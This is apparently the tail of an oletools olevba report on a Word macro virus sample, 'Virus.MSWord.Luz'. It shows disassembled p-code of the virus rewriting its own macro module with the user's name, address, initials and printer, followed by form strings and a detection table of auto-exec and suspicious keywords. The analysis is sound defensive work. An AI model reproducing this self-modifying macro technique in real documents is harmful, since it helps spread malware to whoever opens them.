' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #340:
' 	Ld Rnd 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	St rn 
' Line #341:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #342:
' 	StartWithExpr 
' 	LitStr 0x0007 "Groovie"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #343:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #344:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0166 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #345:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #346:
' 	Ld x 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #347:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #348:
' 	Ld x 
' 	LitStr 0x0003 " ' "
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #349:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #350:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #351:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #352:
' 	EndWith 
' Line #353:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #354:
' 	EndFunc 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Okay�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Luz Clarita Telenovelas Star
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

